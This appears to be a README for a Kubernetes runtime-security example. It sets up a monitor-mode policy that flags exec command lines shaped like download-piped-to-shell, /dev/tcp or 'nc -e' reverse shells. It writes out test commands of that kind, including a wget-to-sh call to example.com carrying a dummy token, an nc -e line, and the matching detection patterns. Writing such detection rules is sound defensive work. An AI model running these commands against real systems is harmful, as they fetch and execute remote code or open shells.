# Catch a command by what it does

## What this shows

A deny list names binaries. `curl | sh`, `wget | sh`, a `/dev/tcp` reverse shell, and
`nc -e` all run through a shell the workload also needs for legitimate reasons, so denying
the shell is not an option, and no path list tells them apart. What they share is the shape
of their command line.

`policy.yaml` observes every exec (`deny.values: ["*"]` in `mode: monitor`) and narrows the
findings with a
[monitorFilter](../../../docs/users/reference/runtimepolicy.md#filtering-monitor-findings)
over `event.exec.argv`:

- `exec-events-only` is the guard. `event.exec` exists only on an exec observation, and
  expressions are ANDed and short-circuit, so the second expression never runs against a
  file or network observation.
- `download-and-run-or-reverse-shell` matches any argument containing a download piped into
  a shell, a `/dev/tcp/` path, or `nc` with `-e`. With `sh -c '...'`, the whole script is one
  argument, which is what lets a regular expression see the pipe. The shell must be a whole
  token, so `| sh`, `| bash`, and `| /bin/sh` match and `| sha256sum` does not. Run directly,
  `nc 192.0.2.1 4444 -e /bin/sh` puts `nc` and `-e` in separate arguments, so the second
  clause checks the executable and the option across the whole argument list.

The Report carries the matched command line in its `argv` property. Every value written to a
Report passes through a fixed redaction step that replaces recognized credential shapes —
bearer tokens, API keys, AWS key IDs, JWTs — and prompt payloads. A credential in another
shape, such as `curl -u user:password`, is not recognized and reaches the Report as written,
so try this with dummy values.

## Requires

Process `exec` observation needs BTF at `/sys/kernel/btf/vmlinux`, plus either BPF-LSM
active (`bpf` in `/sys/kernel/security/lsm`) or, for the `fmod_ret` fallback, kernel 5.7 or
later with the BPF JIT on x86-64 or arm64. Docker Desktop's LinuxKit VM has BPF-LSM active,
so a kind cluster on macOS runs this example. See
[platform support](../../../docs/users/platforms.md).

Nirmata Runtime must be installed — see [installation](../../../docs/users/installation.md).
The policy runs in `mode: monitor`, so nothing is ever blocked.

## Run it

1. Start the workload:

   ```bash
   kubectl apply -f client.yaml
   kubectl wait --for=condition=Ready pod/agent
   ```

2. Apply the policy:

   ```bash
   kubectl apply -f policy.yaml
   kubectl get rpol catch-pipe-to-shell
   ```

   `Applied=True` with reason `Monitoring`.

3. Run two ordinary commands, then a download piped into a shell that carries an API token:

   ```bash
   kubectl exec agent -- ls /
   kubectl exec agent -- sh -c 'echo hello'
   kubectl exec agent -- sh -c \
     'wget -qO- -T 5 --header "Authorization: Bearer sk-live-4f9a8b7c6d5e" http://example.com/install.sh | sh'
   ```

   `wget` reports a 404, because `example.com` serves no `install.sh`. The command is the
   observation, not its outcome.

## Verify

Findings are flushed every 10 seconds, so allow about 20 seconds.

```bash
kubectl get report kyverno-runtime-agent \
  -o jsonpath='{range .results[?(@.policy=="catch-pipe-to-shell")]}{.properties.argv}{"\n"}{end}'
```

Exactly one line:

```text
sh -c wget -qO- -T 5 --header "Authorization: REDACTED http://example.com/install.sh | sh
```

Both directions matter:

- **No result for `ls` or `echo hello`**, although the policy observed both. That absence is
  the filter working: without it, this policy reports every exec in the pod.
- **No token in the result.** The redaction pattern consumes everything up to the next space,
  closing quote included.

A Report keeps one result per policy, pod, and executable. Run a second matching `sh -c`
command and the same result's `count` goes to `2` and its `argv` shows the newer command;
a direct `nc 127.0.0.1 4444 -e /bin/true` adds a separate result for `/bin/nc`.

## What this does not cover

- **An argument past the eighth, or longer than 127 bytes.** The kernel record holds eight
  arguments of 128 bytes each, so a long `sh -c` script is truncated before the filter sees
  it.
- **A script read from a file.** `sh /tmp/x.sh` puts only the file name on the command line.
  The filter sees what was asked for, not what the interpreter then read.
- **Blocking.** The kernel decides from map lookups and cannot consult CEL, so a filter
  narrows what is reported, never what is denied. To block, deny the binaries in an
  `enforce` policy, as in [restrict-exec-allowlist](../../files-and-processes/restrict-exec-allowlist/).

## Clean up

```bash
kubectl delete rpol catch-pipe-to-shell
kubectl delete -f client.yaml
```
